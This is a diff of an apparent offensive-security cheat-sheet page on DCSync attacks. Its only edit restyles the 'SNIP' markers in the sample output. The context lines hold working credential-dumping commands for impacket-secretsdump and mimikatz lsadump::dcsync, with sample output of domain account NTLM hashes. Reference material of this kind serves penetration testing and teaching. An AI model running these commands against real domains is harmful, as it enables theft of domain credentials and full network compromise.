@@ -184,7 +184,7 @@
 </span></span></span><span class="line"><span class="cl"><span class="go">Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
 </span></span></span><span class="line"><span class="cl"><span class="go">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 </span></span></span><span class="line"><span class="cl"><span class="go">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
-</span></span></span><span class="line"><span class="cl"><span class="go">...[SNIP]...
+</span></span></span><span class="line"><span class="cl"><span class="go">---[SNIP]---
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Cleaning up...
 </span></span></span></div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With hashes
 </span></span><span class="line"><span class="cl"><span class="go">impacket-secretsdump -hashes :<span class="o editable-keyword">&lt;HASH&gt;</span> -just-dc '<span class="o editable-keyword">&lt;DOMAIN&gt;</span>/<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;TARGET&gt;</span>'
@@ -197,7 +197,7 @@
 </span></span></span><span class="line"><span class="cl"><span class="go">Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
 </span></span></span><span class="line"><span class="cl"><span class="go">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 </span></span></span><span class="line"><span class="cl"><span class="go">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
-</span></span></span><span class="line"><span class="cl"><span class="go">...[SNIP]...
+</span></span></span><span class="line"><span class="cl"><span class="go">---[SNIP]---
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Cleaning up...
 </span></span></span></div></pre></div></div><div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\mimikatz.exe "lsadump::dcsync /domain:<span class="o editable-keyword">&lt;DOMAIN&gt;</span> /user:administrator" "exit"
 </span></span></span></code><div class="output-bubble">Sample Output:
@@ -235,7 +235,7 @@
 </span></span></span><span class="line"><span class="cl"><span class="go">    ntlm- 1: c718f548c75062ada93250db208d3178
 </span></span></span><span class="line"><span class="cl"><span class="go">    lm  - 0: 336d863559a3f7e69371a85ad959a675
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">...[SNIP]...
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">---[SNIP]---
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">mimikatz(commandline) # exit
 </span></span></span><span class="line"><span class="cl"><span class="go">Bye!
